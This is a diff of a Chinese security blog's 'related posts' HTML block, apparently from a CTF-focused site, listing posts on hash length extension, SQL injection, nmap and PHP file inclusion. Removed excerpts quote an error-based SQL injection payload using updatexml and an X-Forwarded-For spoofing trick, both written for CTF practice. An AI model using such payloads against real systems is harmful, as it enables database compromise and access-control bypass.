+HashPump安装HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、...
 						</p>
 					</div>
 
-					<a href="/2019/04/08/php-create-function-代码注入/" title="php create_function()代码注入">				
-						<img src="/images/post-cover/20.jpg" class="relateImg" alt="php create_function()代码注入">
+					<a href="/2019/06/14/哈希长度拓展攻击-hashpump/" title="哈希长度拓展攻击-hashpump">				
+						<img src="/images/post-cover/6.jpg" class="relateImg" alt="哈希长度拓展攻击-hashpump">
 					</a>
 				</li>											
 		
 		
 				<li>
 					<div>
-						<a href="/2019/04/01/2019年上海嘉韦思杯writeup/" title="2019年上海嘉韦思杯writeup">
-							2019年上海嘉韦思杯writeup
+						<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="‘sql注入新姿势-2019强网杯">
+							‘sql注入新姿势-2019强网杯
 						</a>
 						<p>
-							1土肥原贤二报错注入
-1’ and updatexml(1,concat(0x7e,(database()),0x7e),1)#
-
-然后注表1’ and updatexml(1,concat(0x7e,(select group_co...
+							
 						</p>
 					</div>
 
-					<a href="/2019/04/01/2019年上海嘉韦思杯writeup/" title="2019年上海嘉韦思杯writeup">				
-						<img src="/images/post-cover/14.jpg" class="relateImg" alt="2019年上海嘉韦思杯writeup">
+					<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="‘sql注入新姿势-2019强网杯">				
+						<img src="/img/cart_cover.jpg" class="relateImg" alt="‘sql注入新姿势-2019强网杯">
 					</a>
 				</li>											
 		
 		
 				<li>
 					<div>
-						<a href="/2019/03/26/nmap的使用/" title="nmap的使用">
-							nmap的使用
+						<a href="/2019/06/11/php代码审计之文件包含/" title="php代码审计之文件包含">
+							php代码审计之文件包含
 						</a>
 						<p>
-							前言端口范围：1-65535
-常见的端口以及服务：
-
-21 — ftp协议
-22 — ssh远程登陆端口(linux)
-23 — telnet协议
-25 — 邮箱协议 smtp 发送邮件
-110 — pop3协议 接收邮件
-80 — ...
+							文件包含文件包含分为本地文件包含（Local File Inclusion，简LFI)和远程文件包含（Remote File Inclusion，简RFI）。
+在php中常见的文件包含函数有：
+include()
+include_on...
 						</p>
 					</div>
 
-					<a href="/2019/03/26/nmap的使用/" title="nmap的使用">				
-						<img src="/images/post-cover/6.jpg" class="relateImg" alt="nmap的使用">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2018/12/10/ctf中web的常见知识点/" title="ctf中web的常见知识点">
-							ctf中web的常见知识点
-						</a>
-						<p>
-							本地访问和伪造ipX-Forwarded-For: 127.0.0.1
-域名解析可以更改HTTP头部host字段为flag.bugku.com
-把 flag.bugku.com 解析到120.24.86.145
-直接在
-c:\wind...
-						</p>
-					</div>
-
-					<a href="/2018/12/10/ctf中web的常见知识点/" title="ctf中web的常见知识点">				
-						<img src="/images/post-cover/9.jpg" class="relateImg" alt="ctf中web的常见知识点">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2018/12/04/2018安恒杯好黑的黑名单/" title="2018安恒杯好黑的黑名单">
-							2018安恒杯好黑的黑名单
-						</a>
-						<p>
-							  emmm，这个题是个好题。本题考察sql注入。绕过方法是以前没有遇见过的。里面利用了betwee  and  的特性。
-  尝试对其进行注入，发现明显的过滤。一旦关键字在黑名单里，就会有：这么坏？想让我下面给你吃吗？XD 的字样。...
-						</p>
-					</div>
-
-					<a href="/2018/12/04/2018安恒杯好黑的黑名单/" title="2018安恒杯好黑的黑名单">				
-						<img src="/images/post-cover/15.jpg" class="relateImg" alt="2018安恒杯好黑的黑名单">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2018/11/28/十大挖矿神器/" title="十大挖矿神器">
-							十大挖矿神器
-						</a>
-						<p>
-							十大挖洞必备神器
-0x00 Burp Suite
-
-
-Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。
-也就是说，Burp Suite是web应用...
-						</p>
-					</div>
-
-					<a href="/2018/11/28/十大挖矿神器/" title="十大挖矿神器">				
-						<img src="/images/post-cover/16.jpg" class="relateImg" alt="十大挖矿神器">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2018/11/23/insert-into-注入/" title="insert into 注入">
-							insert into 注入
-						</a>
-						<p>
-							题目题目连接：http://123.206.87.240:8002/web15/题目提示：
-flag格式：flag{xxxxxxxxxxxx}
-不如写个Python吧
-
-error_reporting(0);
-
-function ge...
-						</p>
-					</div>
-
-					<a href="/2018/11/23/insert-into-注入/" title="insert into 注入">				
-						<img src="/images/post-cover/7.jpg" class="relateImg" alt="insert into 注入">
+					<a href="/2019/06/11/php代码审计之文件包含/" title="php代码审计之文件包含">				
+						<img src="/images/post-cover/37.jpg" class="relateImg" alt="php代码审计之文件包含">
 					</a>
 				</li>											
 		
